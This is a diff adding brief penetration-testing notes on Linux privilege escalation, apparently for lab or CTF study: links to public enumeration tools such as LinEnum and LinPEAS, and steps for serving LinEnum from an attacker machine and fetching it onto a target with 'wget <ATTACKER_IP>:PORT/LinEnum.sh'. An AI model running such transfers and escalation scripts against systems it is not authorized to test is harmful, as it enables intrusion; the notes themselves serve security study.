@@ -1,0 +1,18 @@
+Tools:
+  LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+  LinEnum: https://github.com/rebootuser/LinEnum
+  LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+  Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+  Linux Priv Checker: https://github.com/linted/linuxprivchecker 
+
+LinEnum - bash script that performs common commands related to privilege escalation
+Source: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+Get LinEnum on the target machine:
+  python3 -m http.server 8000
+  wget <ATTACKER_IP>:PORT/LinEnum.sh
+  chmod +x LinEnum.sh
+or
+  Copy the raw LinEnum code from github and paste into new file
+  in the target machine
+  chmod +x LinEnum.sh
